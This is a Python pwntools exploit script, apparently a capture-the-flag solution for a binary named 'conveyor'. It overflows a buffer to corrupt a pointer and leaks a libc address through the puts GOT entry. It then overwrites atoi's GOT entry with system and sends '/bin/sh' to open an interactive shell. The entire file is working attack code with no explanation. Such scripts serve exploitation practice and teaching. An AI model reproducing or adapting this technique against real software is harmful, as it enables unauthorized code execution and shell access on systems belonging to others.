#!/usr/bin/env python3

from pwn import *


def calc_libcbase_addr(res):
    printf_addr = re.findall(b'\x0a(.*)\x0a',res)[0]
    printf_addr = u64(printf_addr + (8-len(printf_addr)) * b'\x00')
    print("printf is at 0x%x" % printf_addr)

    printf_offset = 0x00064e80
    libc_base = printf_addr - printf_offset
    print("libc base is at 0x%x" % libc_base)
    return libc_base

def change_pointer_value(new_addr):
    menu = p.recv(timeout=0.5)
    print(menu)

    p.sendline('1')
    add_part = p.recv(timeout=0.5)
    print(add_part)

    print('[+] Setting part name...')
    p.sendline('abc')

    menu = p.recv(timeout=0.5)
    print(menu)

    print('[+] Choose option 2...')
    p.sendline('2')

    sleep(1)
    data = p.recv(timeout=1)
    print(data)

    print('[+] Setting alternative...')
    p.sendline('x')
    print(p.recv(timeout=0.5))

    payload = flat('A'*120)
    payload += new_addr[:7]

    print('[+] Sending payload...: %s' % payload)
    p.send(payload)

def skip_alternative():
    print('[+] Sending "Y" to skip alternative...')
    sleep(0.5)
    p.send(b'Y\x00\x0a')
    #p.sendline(b'Y\x00')
    sleep(0.5)

def pwn(p):

    # Stage 1: leak libc func address
    puts_got = 0x602030
    change_pointer_value(p64(puts_got))
    sleep(1)
    libcbase_addr = calc_libcbase_addr(p.recv(timeout=0.5))

    skip_alternative()

    ##
    # Stage 2: change atoi GOT address to system
    ##

    atoi_got = 0x602058
    change_pointer_value(p64(atoi_got))

    print(p.recv(timeout=0.5))
    p.sendline('x')
    print(p.recv(timeout=0.5))

    system_offset = 0x0004f440
    system_addr = libcbase_addr + system_offset

    print('[+] Sending system address to atoi@GOT...')
    p.sendline(p64(system_addr))
    sleep(0.5)

    ##
    # Stage 3: call system with /bin/sh
    ##

    print(p.recv(timeout=0.5))

    print('[+] Sending "/bin/sh" to atoi(), should get a shell...')
    p.sendline('/bin/sh')
    p.clean()
    p.interactive()

    p.close()

if __name__ == "__main__":
    context.binary = ELF('./conveyor')

    if args['REMOTE']:
        p = remote('127.0.0.1', 4444)
    else:
        p = process(context.binary.path)

    pwn(p)
